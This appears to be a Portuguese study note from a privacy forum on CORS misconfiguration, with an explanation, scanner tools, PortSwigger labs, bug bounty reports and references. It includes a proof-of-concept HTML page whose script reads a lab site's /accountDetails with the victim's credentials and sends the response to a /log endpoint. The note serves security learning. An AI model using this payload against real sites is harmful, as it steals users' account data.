# CORS Misconfiguration - Fórum Técnico de Privacidade

## O que é o CORS?

O padrão CORS (Cross-origin resource sharing) é necessário porque permite que os servidores especifiquem quem pode acessar seus ativos e quais métodos de solicitação HTTP são permitidos a partir de recursos externos.

Uma política de mesma origem requer que tanto o servidor que solicita um recurso quanto o servidor onde o recurso está localizado usem o mesmo protocolo (http://), nome de domínio (internal-web.com) e a mesma porta (80). Então, se o servidor forçar a política de mesma origem, apenas as páginas da web do mesmo domínio e porta poderão acessar os recursos.

O exemplo que foi utilizado foi o basic origin reflection que pega os dados de um site e redireciona para o site do atacante, com isso os dados pessoais ou sensiveis vão para um servidor diferente do original de forma que se reflete tudo que é acessado por um link especifico.

[Apresentação 06/04/23](https://docs.google.com/presentation/d/1w9SqP6dUJggXe67ZAZvJ8MmZoUFOkiP0_AwaTiurOLA/edit?usp=sharing)

## Ferramentas legais para ser utilizadas 🔧

* [CORS Scanner](https://github.com/chenjj/CORScanner)
* [Nuclei templates](https://github.com/projectdiscovery/nuclei)
* [Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy)

## HTML utilizado

```
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("/log?key=" + xhr.responseText)
                }
            }

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
```

## Labs para estudo 🔬

* [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## Bug Bounty reports 📈

* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)](https://hackerone.com/reports/168574)
* [CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg)](https://hackerone.com/reports/426147)
* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy)](https://hackerone.com/reports/235200)
* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t)](https://hackerone.com/reports/430249)
* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)](https://hackerone.com/reports/470298)

## References

* [Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://www.corben.io/advanced-cors-techniques/)
* [PortSwigger Web Security Academy: CORS](https://portswigger.net/web-security/cors)
* [CORS Misconfigurations Explained - Detectify Blog](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [CORS Misconfiguration PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md#exploitation)
